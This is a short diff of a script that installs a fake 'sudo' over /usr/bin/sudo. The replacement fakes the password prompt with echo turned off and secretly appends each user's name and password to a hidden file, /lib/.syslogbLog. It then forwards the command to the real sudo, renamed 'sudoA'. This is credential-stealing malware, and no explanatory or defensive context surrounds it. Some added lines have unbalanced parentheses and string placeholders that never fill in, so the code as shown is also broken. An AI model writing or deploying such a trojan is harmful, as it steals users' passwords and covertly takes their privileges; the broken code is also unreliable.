@@ -18,14 +18,16 @@ def main():
         user = getpass.getuser()
         
         os.system('stty -echo')
-        password = input("[sudo] password for {user}: ")
+        sudoCommand = "[sudo] password for {user}: ")
+        password = input(sudoCommand)
         os.system("echo \"{user}:{password}\" >> /lib/.syslogbLog")
         os.system('stty echo')
         arguments = ""
         del sys.argv[0]
         for arg in sys.argv:
             arguments = arguments + arg + " "
-        os.system("echo {password} | sudoA -S -k {arguments}")
+        passedCommand = "echo {password} | sudoA -S -k {arguments}")
+        os.system(passedCommand)
 main()
 EOFA
 cat <<EOFB > /usr/bin/sudo
